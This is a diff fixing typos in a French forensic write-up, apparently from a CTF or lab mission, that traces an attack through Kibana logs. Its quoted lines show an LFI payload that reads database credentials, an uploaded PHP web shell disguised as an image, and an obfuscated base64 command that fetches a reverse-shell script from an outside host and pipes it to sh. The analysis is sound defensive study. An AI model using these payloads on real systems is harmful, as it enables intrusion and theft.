@@ -11,7 +11,7 @@ Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser 
 
 ## Local File Inclusion 
 
-On observe un pic d'activité, ce pic s'apparente à du fuzzing : l'attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu'à la fin de ce pic l'attaquant va exploiter la faille. On trouve alors la première exploitation : 
+On observe un pic d'activité, ce pic s'apparente à du fuzzing : l'attaquant essaye de trouver une vulnérabilité dans le système. On peut supposer qu'à la fin de ce pic l'attaquant va exploiter la faille. On trouve alors la première exploitation : 
 
 ```
 /?lang=php://filter/read=convert.base64-encode&page=resource=db/connect
@@ -19,7 +19,7 @@ On observe un pic d'activité, ce pic s'apparente à du fuzzing : l'attaquant es
 
 L'attaquant arrive ici à lire les informations de connexion et s'authentifie peu après sur la page d'administration. 
 
-## Telechargement d'un reverse shell 
+## Téléchargement d'un reverse shell 
 
 Après s'être authentifié, l'attaquant va téléverser du code php `ev1L.php.png` pour pouvoir exécuter des commandes sur la machine :  
 
@@ -27,7 +27,7 @@ Après s'être authentifié, l'attaquant va téléverser du code php `ev1L.php.p
 /admin-page/manage.php?success=true&path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png 
 ```
 
-il va en suite télécharger un reverse shell via ce même script : 
+Il va ensuite télécharger un reverse shell via ce même script : 
 
 ```
 10.143.17.101 - - [28/Mar/2025:00:32:16 +0100] "GET /admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64+-d|sh HTTP/1.1" 200 2144 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
